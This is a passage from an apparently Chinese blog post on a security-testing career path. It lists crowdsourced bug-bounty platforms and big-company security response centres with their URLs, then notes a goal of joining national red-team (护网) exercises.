|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[看雪渗透测试服务](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>​Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>​目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year 

---

